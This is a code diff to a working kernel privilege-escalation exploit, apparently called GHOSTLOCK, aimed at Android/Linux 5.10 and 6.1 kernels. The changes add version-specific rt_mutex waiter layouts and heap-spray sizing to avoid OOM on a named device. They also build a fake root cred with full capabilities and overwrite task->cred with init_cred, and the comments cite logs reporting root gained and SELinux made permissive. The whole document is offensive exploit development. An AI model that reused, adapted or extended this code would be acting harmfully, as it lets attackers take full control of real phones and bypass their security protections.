@@ -43,10 +43,28 @@ void clear_pselect_write(void) {
   pselect_custom_target = 0;
 }
 
+/* 5.10 GKI: rt_mutex_waiter has no wake_state/ww_ctx; prio sits at
+ * offset 0x40 directly (6.1 has wake_state@0x40, prio@0x44). */
+int is_5_10_waiter(void) {
+  return active_offsets && active_offsets->uname_r &&
+         strncmp(active_offsets->uname_r, "5.10.", 5) == 0;
+}
+
 int tcp_route_selected(void) {
   /* compact defaults to tcp; GHOSTLOCK_TCP_ROUTE=0 selects pselect */
   const char *s = getenv("GHOSTLOCK_TCP_ROUTE");
   if (s && *s && strcmp(s, "0") == 0) {
+    return 0;
+  }
+  if (s && *s && strcmp(s, "1") == 0) {
+    return 1;
+  }
+  /* 5.10 rejects the TCP zerocopy route with EINVAL: tcp_zerocopy_receive()
+   * validates zc->address first (find_vma requires a real tcp zerocopy VMA),
+   * and the 5.10 struct tcp_zerocopy_receive is only 0x28 bytes, so the
+   * waiter_task/fake_lock words at 0x28/0x30 are never copied in. The
+   * pselect route reaches SELinux permissive on 5.10; use it by default. */
+  if (is_5_10_waiter()) {
     return 0;
   }
   return active_offsets && active_offsets->compact_waiter;
@@ -204,15 +222,97 @@ void put32(unsigned char *p, size_t off, uint32_t value) {
   memcpy(p + off, &value, sizeof(value));
 }
 
+/* Build a *liveable* fake root cred in the sprayed page.
+ *
+ * Two distinct failure modes were conflated before; both are addressed here.
+ *
+ * (1) POST-WRITE PANIC (the RC=255 that followed a successful ret=6).
+ *     Once task->cred points at this copy, any put_cred() (fork/exec/exit)
+ *     runs atomic_dec_and_test(&cred->usage). With usage==1 that hits 0 and
+ *     calls __put_cred() -> cred_free() ->
+ *       kmem_cache_free(cred_jar, <sprayed page>)   // not a slab object
+ *     which corrupts the slab allocator and panics. Fix: usage is large AND
+ *     odd, so the count can never reach 0 and cred_free() is never entered.
+ *     (init_cred cannot be used directly either: it is .data, not .rodata,
+ *     so get_cred() would not fault -- but freeing it on exit would destroy
+ *     every kernel thread that still references it.)
+ *
+ * (2) NULL-DEREF ON FIRST USE. Cred was memset to 0, leaving user/user_ns/
+ *     group_info NULL. The first fork() does get_uid(cred->user) and every
+ *     capable() reads cred->user_ns -> immediate NULL deref. These must be
+ *     the real &root_user / &init_user_ns / &init_groups. Note that
+ *     init_cred + <offset> is the ADDRESS OF THE POINTER FIELD, not the
+ *     object, so it cannot be reused as the value; the real symbol addresses
+ *     have to be supplied. See GHOSTLOCK_CRED_PTRS below.
+ *
+ * The ODD usage also keeps the erased rbtree node RED, which skips
+ * ____rb_erase_color() rebalancing (only black nodes rebalance). */
 static void fill_init_cred_copy(unsigned char *p, size_t off) {
   unsigned char *c = p + off;
-  memset(c, 0, 136);
-  put32(c, 0, 1);
-  put64(c, 48, 0xFFFFFFFFFFFFFFFFULL);
-  put64(c, 56, 0xFFFFFFFFFFFFFFFFULL);
-  put64(c, 64, 0xFFFFFFFFFFFFFFFFULL);
-  put64(c, 72, 0xFFFFFFFFFFFFFFFFULL);
-  put64(c, 80, 0xFFFFFFFFFFFFFFFFULL);
+  /* Zero the whole struct: uid/gid/suid/sgid/euid/egid/fsuid/fsgid==0,
+   * securebits==0, keyrings==NULL, rcu==0. */
+  memset(c, 0, CRED_SIZE);
+
+  int usage = 0x7fffffff; /* large -> never freed; odd -> RED node */
+  const char *eu = getenv("GHOSTLOCK_W2_USAGE");
+  if (eu && *eu) usage = (int)strtol(eu, NULL, 0);
+  put32(c, CRED_USAGE_OFF, (uint32_t)usage);
+
+  /* Full capability sets (CAP_FULL_SET): a uid-0 cred with empty caps is
+   * not actually privileged -- capable() would still fail. */
+  for (int i = 0; i < 5; i++) {
+    put64(c, CRED_CAPS_OFF + (size_t)i * 8, 0xFFFFFFFFFFFFFFFFULL);
+  }
+
+  /* security = NULL: LSM blob. kfree(NULL) is a no-op and W1 has already
+   * made SELinux permissive, so an empty blob is safe. */
+  put64(c, CRED_SECURITY_OFF, 0);
+
+  /* (2) continued -- user / user_ns / group_info. These are refcounted
+   * kernel objects (root_user / init_user_ns / init_groups) and their
+   * offsets move with the layout, so they are NOT guessed here: a wrong
+   * pointer is worse than NULL because it corrupts instead of just oopsing.
+   * Supply per target, e.g.
+   *   GHOSTLOCK_CRED_PTRS=1 \
+   *   GHOSTLOCK_CRED_USER_OFF=0x80 GHOSTLOCK_ROOT_USER_ADDR=0xffffff... \
+   *   GHOSTLOCK_CRED_NS_OFF=0x88   GHOSTLOCK_INIT_NS_ADDR=0xffffff... \
+   *   GHOSTLOCK_CRED_GI_OFF=0x90   GHOSTLOCK_INIT_GROUPS_ADDR=0xffffff...
+   * (offsets from dump_btf.py, addresses from the target's System.map +
+   *  KASLR slide). Until then they stay NULL and the process oopses on its
+   * first fork() -- that is the known remaining gap, not a silent failure. */
+  const char *cp = getenv("GHOSTLOCK_CRED_PTRS");
+  if (cp && *cp && strcmp(cp, "0") != 0) {
+    struct {
+      const char *off_env; const char *addr_env; const char *what;
+    } ptrs[] = {
+      {"GHOSTLOCK_CRED_USER_OFF", "GHOSTLOCK_ROOT_USER_ADDR", "user"},
+      {"GHOSTLOCK_CRED_NS_OFF", "GHOSTLOCK_INIT_NS_ADDR", "user_ns"},
+      {"GHOSTLOCK_CRED_GI_OFF", "GHOSTLOCK_INIT_GROUPS_ADDR", "group_info"},
+    };
+    for (size_t i = 0; i < sizeof(ptrs) / sizeof(ptrs[0]); i++) {
+      const char *o = getenv(ptrs[i].off_env);
+      const char *a = getenv(ptrs[i].addr_env);
+      if (!o || !*o || !a || !*a) {
+        pr_warning("W2: %s needs %s and %s, left NULL\n",
+                   ptrs[i].what, ptrs[i].off_env, ptrs[i].addr_env);
+        continue;
+      }
+      size_t coff = (size_t)strtoull(o, NULL, 0);
+      uint64_t addr = strtoull(a, NULL, 0);
+      put64(c, coff, addr);
+      pr_info("W2: cred->%s @0x%zx := 0x%016llx\n", ptrs[i].what, coff,
+              (unsigned long long)addr);
+    }
+  }
+
+  /* Diagnostic only: plant a self-referential sibling at +8/+16 in case a
+   * future kernel variant does run the rebalance on this node. */
+  const char *sp = getenv("GHOSTLOCK_W2_SIBPTR");
+  if (sp && *sp) {
+    uintptr_t self = (uintptr_t)c;
+    put64(c, 8, self);
+    put64(c, 16, self);
+  }
 }
 
 pid_t clone_child(void) {
@@ -303,12 +403,27 @@ int clone_memfd(void) {
   return fd;
 }
 
+/* 5.10 / marble: the full spray is ~540 child processes plus a memfd each.
+ * On an 11GB device with MIUI resident that OOMs the system (oom_reaper
+ * starts killing processes, which also takes out adbd) before the later
+ * stages finish. Halve the two large ctxs; GHOSTLOCK_SPRAY_DIV can
+ * override the divisor for tuning. */
+static size_t spray_divisor(void) {
+  const char *s = getenv("GHOSTLOCK_SPRAY_DIV");
+  if (s && *s) {
+    long v = strtol(s, NULL, 10);
+    if (v >= 1) return (size_t)v;
+  }
+  return is_5_10_waiter() ? 2 : 1;
+}
+
 void prepare_ctxs(void) {
-  prepare_ctx.mm_cnt = 8 * mm_objs_per_slab;
+  size_t div = spray_divisor();
+  prepare_ctx.mm_cnt = (8 / div) * mm_objs_per_slab;
   prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
   prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);
 
-  spray_ctx.mm_cnt = (1 + MM_PARTIALS) * mm_objs_per_slab;
+  spray_ctx.mm_cnt = ((1 + MM_PARTIALS) / div) * mm_objs_per_slab;
   spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
   spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);
 
@@ -336,22 +451,34 @@ int prepare_skb_payload(uintptr_t base) {
   fake_task = payload_base + fake_task_off;
   fake_fops = payload_base + FOPS_TABLE_OFF;
   if (pselect_custom_write) {
-    if (pselect_child_node) {
-      if (pselect_custom_write == 2) {
-        /* W2 uses init_cred; resolve it from the selected device entry. */
-        fake_right = data_addr(g_init_cred_image);
-      } else {
-        /* W1 targets the initialized page at base+0x100. */
-        fake_right = base + 0x100;
-      }
-    } else {
-      fake_right = 0;  /* leaf: write 0 */
-    }
     fake_left = 0;
     if (pselect_custom_write == 2) {
-      fake_fops = payload_base + (tcp ? TCP_CRED_COPY_OFF : CRED_COPY_OFF);
+      /* W2: write task->cred := init_cred (the classic commit_creds(&init_cred)
+       * primitive, done by a raw pointer store). Evidence, not theory:
+       *   gl3_root_success.log  in0=ffffff802a7a0930 (init_cred alias)  -> child uid = 0, root OK
+       *   gl_w2fix_run1.log     in0=ffffff884c9b0200 (sprayed cred copy) -> kernel panic, reboot
+       * init_cred is a *real, fully populated* cred: uid/gid 0, full caps, and
+       * -- the part a hand-built copy gets wrong -- valid user / user_ns /
+       * group_info pointers. A sprayed copy leaves those NULL, and getuid()
+       * is from_kuid_munged(current_user_ns(), ...) -> NULL deref -> panic.
+       * The old "init_cred faults on get_cred() into .rodata" theory is wrong:
+       * System.map puts init_cred in 'D' (.data, writable), and we store the
+       * pointer directly without going through commit_creds()/get_cred().
+       * GHOSTLOCK_W2_VAL=fake restores the sprayed-copy variant for A/B. */
+      uintptr_t w2val = data_addr(g_init_cred_image);
+      const char *vv = getenv("GHOSTLOCK_W2_VAL");
+      if (vv && strcmp(vv, "fake") == 0)
+        w2val = payload_base + (tcp ? TCP_CRED_COPY_OFF : CRED_COPY_OFF);
+      fake_fops = w2val;
+      fake_right = pselect_child_node ? w2val : 0;
+    } else {
+      /* W1 targets the initialized page at base+0x100. */
+      fake_right = pselect_child_node ? (base + 0x100) : 0;
+      fake_fops = payload_base + FOPS_TABLE_OFF;
     }
     fake_parent = pselect_custom_target - 8;
+    pr_info("DBG-W2 mode=%d child=%d fake_right=%016zx fake_fops=%016zx fake_parent=%016zx target=%016zx\n",
+            pselect_custom_write, pselect_child_node, fake_right, fake_fops, fake_parent, pselect_custom_target);
   }
 
   uintptr_t write_pc = fake_parent;
@@ -368,8 +495,27 @@ int prepare_skb_payload(uintptr_t base) {
 
     put32(p, LOCK_OFF + 0x00, 0);
     put64(p, LOCK_OFF + 0x08, fake_w0);
-    put64(p, LOCK_OFF + 0x10, fake_w0);
-    put64(p, LOCK_OFF + 0x18, fake_task | 1);
+    /* GHOSTLOCK_NOWRITE=1: keep the UAF firing but make remove_waiter()
+     * bail out at "if (!owner || !is_top_waiter) return;" -- owner == NULL
+     * AND waiters.rb_leftmost != the erased waiter, so rt_mutex_dequeue_pi()
+     * (the write) never runs. Binary-searches where the W1 panic lives:
+     *   no panic  => it is inside the owner path (dequeue_pi/adjust_prio)
+     *   still panics => it is at/before the tree erase, i.e. in the futex
+     *                   requeue rollback itself, not in remove_waiter. */
+    uintptr_t leftmost = fake_w0;
+    uintptr_t lock_owner = 0;
+    {
+      const char *nw = getenv("GHOSTLOCK_NOWRITE");
+      if (nw && *nw && strcmp(nw, "0") != 0) {
+        leftmost = fake_w0 + 0x18;
+      } else {
+        lock_owner = INIT_TASK;
+        const char *ow = getenv("GHOSTLOCK_OWNER");
+        if (ow && strcmp(ow, "fake") == 0) lock_owner = fake_task;
+      }
+    }
+    put64(p, LOCK_OFF + 0x10, leftmost);
+    put64(p, LOCK_OFF + 0x18, lock_owner ? (lock_owner | 1) : 0);
 
     if (compact) {
       /* Words ride the erase relink: pc = value, rb_left = dest,
@@ -392,10 +538,18 @@ int prepare_skb_payload(uintptr_t base) {
       }
       put64(p, W0_OFF + 0x30, waiter_task); /* task */
       put64(p, W0_OFF + 0x38, fake_lock);   /* lock */
-      put32(p, W0_OFF + 0x40, 0);           /* wake_state */
-      put32(p, W0_OFF + 0x44, FAKE_WAITER_PRIO); /* prio */
-      put64(p, W0_OFF + 0x48, 0);           /* deadline */
-      put64(p, W0_OFF + 0x50, 0);           /* ww_ctx */
+      if (is_5_10_waiter()) {
+        /* 5.10: no wake_state/ww_ctx; prio directly at 0x40, deadline 0x48. */
+        put32(p, W0_OFF + 0x40, FAKE_WAITER_PRIO); /* prio */
+        put32(p, W0_OFF + 0x44, 0);                /* padding */
+        put64(p, W0_OFF + 0x48, 0);                /* deadline */
+      } else {
+        /* 6.1: wake_state@0x40, prio@0x44, deadline@0x48, ww_ctx@0x50. */
+        put32(p, W0_OFF + 0x40, 0);           /* wake_state */
+        put32(p, W0_OFF + 0x44, FAKE_WAITER_PRIO); /* prio */
+        put64(p, W0_OFF + 0x48, 0);           /* deadline */
+        put64(p, W0_OFF + 0x50, 0);           /* ww_ctx */
+      }
     } else {
       /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
       put64(p, W0_OFF + 0x00, 1);
@@ -477,8 +631,13 @@ uintptr_t prepare_kernel_page(void) {
   }
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+  int ks_verbose = 0;
+  {
+    const char *v = getenv("GHOSTLOCK_KS_VERBOSE");
+    if (v && *v && strcmp(v, "1") == 0) ks_verbose = 1;
+  }
   ks = kernelsnitch_setup(
-      mm_struct_sz(), MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+      mm_struct_sz(), MM_ORDER, cpu_count, KSNITCH_COLLISIONS, ks_verbose, 0);
   pr_info("[spray] mm spray + kernelsnitch ready (cpu=%d) +%lldms\n",
           cpu_count, ms_since(&t_spray));
 
